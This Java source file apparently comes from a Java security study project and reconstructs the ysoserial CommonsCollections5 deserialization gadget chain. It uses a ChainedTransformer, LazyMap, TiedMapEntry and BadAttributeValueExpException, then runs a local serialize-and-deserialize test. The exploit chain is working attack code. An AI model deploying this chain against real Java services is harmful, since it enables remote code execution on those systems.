package com.pacemrc.javasec.deserialize.ysoserial;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

import com.pacemrc.javasec.utils.*;

public class CC5 {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = Sinks.getTransformerArraySink();
        Transformer chainedTransformer =new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"chd");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException,"val",tiedMapEntry);

        Deserialize.doSerialAndDeserial(badAttributeValueExpException);
    }
}
